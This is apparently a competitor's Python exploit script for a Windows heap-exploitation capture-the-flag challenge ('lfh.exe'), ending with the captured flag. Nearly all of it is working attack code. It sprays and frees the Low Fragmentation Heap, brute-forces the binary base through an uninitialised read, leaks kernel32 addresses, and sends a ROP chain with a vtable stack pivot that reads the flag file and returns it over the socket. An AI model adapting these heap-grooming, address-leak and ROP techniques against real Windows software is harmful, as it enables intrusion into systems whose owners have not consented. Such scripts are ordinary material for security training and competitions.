from pwintools import *
from time import sleep

binary = PE(r'.\lfh.exe')
k32 = PE(r'.\bins\kernel32.dll')

# pre-leak
IP, PORT, binary.base, k32.base = 'flu.xxx', 2094, 0x009f0000, 0x75b00000

DEBUG = False
def run():
    global _p, p
    if DEBUG:
        binary.base, k32.base = 0xf0000, 0x76320000
        _p = Process('lfh.exe')
        #_p.spawn_debugger(x96dbg = True, sleep = 5)
        sleep(0.5)
        p = Remote('127.0.0.1', 9999)
        p.timeout = 20000000
    else:
        print(PORT)
        p = Remote(IP, PORT)
        p.timeout = 1500

def destroy():
    try:
        _p.close()
    except:
        pass
    try:
        p.close()
    except:
        pass

def cmd(sel, data):
    p.recvuntil('\xCC\x00')
    p.send(str(sel))
    p.send(data)

def sel1(s):
    cmd(1, s)  # s == '\n' causes uninit var access
    p.recvuntil('DEBUG: obj->hash:\0')
    return p.recvuntil('\xAA\xBB')[:-2]

def sel2(wait=4000):
    old_timeout, p.timeout = p.timeout, wait
    cmd(2, '')  # liveliness test?
    p.timeout = old_timeout

def sel3(elem_cnt, indices, strs):
    payload  = p32(elem_cnt)
    payload += ''.join(map(lambda x: p32(x[0])+x[1][0]+x[1][1], zip(indices, strs)))
    cmd(3, payload)

def sel3_free():
    cmd(3, p32(0xffff))

def spray(cnt, spray_payload):
    elem_cnt = cnt
    indices = list(range(elem_cnt))
    assert('\n' not in spray_payload[:-1])
    strs = [(spray_payload, spray_payload)] * elem_cnt
    sel3(elem_cnt, indices, strs)

# binary base leak
def leak_binary_base():
    match_1 = ''.join(chr(int(c, 16)) for c in """
    38 39 3A 3B 3C 3D 3E 3F  40 41 42 43 44 45 46 47
    48 49 4A 4B 4C 4D 4E 4F  50 51 52 53 54 55 56 57
    58 59 5A 5B 5C 5D 5E 5F  60 41 42 43 44 45 46 47
    48 49 4A 4B 4C 4D 4E 4F  50 51 52 53 54 55 56 57
    58 59 5A 7B 7C 7D 7E 7F  80 81 82 83 84 85 86 87
    88 89 8A 8B 8C 8D 8E 8F  90 91 92 93 94 95 96 97
    98 99 9A 9B 9C 9D 9E 9F  A0 A1 A2 A3 A4 A5 A6 A7
    A8 A9 AA AB AC AD AE AF  B0 B1 B2 B3 B4 B5 B6 B7
    B8 B9 BA BB BC BD BE BF  C0 C1 C2 C3 C4 C5 C6 C7
    C8 C9 CA CB CC CD CE CF  D0 D1 D2 D3 D4 D5 D6 D7
    D8 D9 DA DB DC DD DE DF  E0 E1 E2 E3 E4 E5 E6 E7
    E8 E9 EA EB EC ED EE EF  F0 F1 F2 F3 F4 F5 F6 F7
    F8 F9 FA FB FC FD FE FF  75
    """.strip().split())
    match_2 = '\x83\xE6\x3F\x80\x7F\x29'

    # we can be 2x faster, but oh well it still works :)
    for i in range(0x1, 0x10000):
        try:
            try_base = i * 0x10000
            log.info('Trying base {:08x}'.format(try_base))

            # 1. saturate LFH
            alternative = False
            spray_payload = 'A'*0x1c + p32(try_base + 0x00017b00)[:-1] + '\n'
            if '\n' in spray_payload[:-1]:
                alternative = True
                spray_payload = 'A'*0x1c + p32(try_base + 0x00007500)[:-1] + '\n'
                if '\n' in spray_payload[:-1]:  # 0x0a??????-like bases, let's just :pray:
                    log.info('Skipping base {:08x}'.format(try_base))
                    continue

            run()
            sel2()

            spray(0x18 // 2, spray_payload)

            # 2. free all at LFH
            sel3_free()

            # 3. try probing
            # read base + 0x00017B00 => if hit, yields match_1
            # read base + 0x00007500 => if hit, yields match_2
            res = sel1('\n')
            if (not alternative and res == match_1) or (alternative and res == match_2):
                return try_base

            # else, we've probed something else but got different results (heap, other dlls, etc.)
            log.info("Misprobe")
        except KeyboardInterrupt:
            break
        except:
            pass
        finally:
            destroy()
    
    return None

def leak_k32_base():
    # kernel32 leak
    run()
    sel2()

    idt_ptr = binary.base + 0x15000

    spray(0x18 // 2, 'A'*0x1c + p32(idt_ptr)[:-1] + '\n')
    sel3_free()

    res = sel1('\n')[:4]
    WriteConsoleW = u32(res.ljust(4, '\0'))
    log.info('WriteConsoleW: {:08x}'.format(WriteConsoleW))

    k32_base = WriteConsoleW - k32.symbols['WriteConsoleW']
    assert k32_base & 0xffff == 0

    destroy()

    return k32_base

# first alloc 0x20 => first LFH 0x20, UserBlocks cnt 0x18

#binary.base = leak_binary_base()
log.success('lfh.exe: {:08x}'.format(binary.base))
#k32.base = leak_k32_base()
log.success('kernel32.dll: {:08x}'.format(k32.base))

for i in range(10000):
    try:
        log.info('Attempt {}'.format(i))

        run()
        try:
            sel2()
        except KeyboardInterrupt:
            break
        except:
            log.warning("Response too slow...")
            break

        sel1('a\n')

        """
        base: k32
        0x1090e : mov esp, ebp ; pop ebp ; ret
        0x10911 : ret
        0x6d23b : push esp ; pop esi ; ret
        0x1e7b2 : pop eax ; ret
        0x49b82 : add eax, esi ; pop esi ; ret
        0x47718 : mov eax, dword ptr [eax] ; ret
        0x223a7 : pop ecx ; ret
        0x1fb4b : mov ecx, eax ; mov eax, ecx ; pop ebp ; ret
        0x5dfa3 : mov dword ptr [eax], ecx ; xor eax, eax ; pop ebp ; ret 0x18
        """
        flag_buf = binary.base + 0x1f840
        overlapped = binary.base + 0x1f940
        send18b = binary.base + 0x12CF
        sockfd_ptr = binary.base + 0x1E9A0
        rop  = ''
        rop += p32(0)
        rop += p32(k32.base + 0x1e7b2) + p32(binary.base + 0x1E9A8)  # eax = &hFlag
        rop += p32(k32.base + 0x47718)  # eax = *eax
        rop += p32(k32.base + 0x1fb4b) + p32(0)  # ecx = eax (= hFlag)
        rop += p32(k32.base + 0x1e7b2) + p32(0x30)  # eax = 0x30  (offset @ stack 0x1337)
        rop += p32(k32.base + 0x6d23b)  # esi = esp
        rop += p32(k32.base + 0x49b82) + p32(0)  # eax = eax + esi
        rop += p32(k32.base + 0x5dfa3) + p32(0)  # [eax] = ecx  (*(arg loc) = hFlag)
        rop += p32(k32.base + k32.symbols['ReadFile']) + 'A'*0x18 + p32(k32.base + 0x223a7) + p32(0x1337) + p32(flag_buf) + p32(0x100) + p32(0) + p32(overlapped)
        rop += p32(sockfd_ptr)  # already return to pop ecx
        for i in range(3):
            rop += p32(send18b) + p32(k32.base + 0x223a7) + p32(flag_buf + 18 * i) + p32(sockfd_ptr)
        rop += '\n'

        vtable_payload = p32(0) + p32(k32.base + 0x1090e) + '\n'  # vtable 2nd function as stack pivoter

        assert '\n' not in (rop[:-1] + vtable_payload[:-1])

        # very roughly approx. 1 / 0x18 chance of overwrite
        indices = [0, -5 & 0xffffffff]
        strs = [('\0\n', rop), ('\a\n', vtable_payload)]
        sel3(2, indices, strs)

        print(p.recvuntil('}'))
        break
    except KeyboardInterrupt:
        break
    except:
        pass
    finally:
        destroy()

### flag{must_be_a_197_iq_hacker} ###
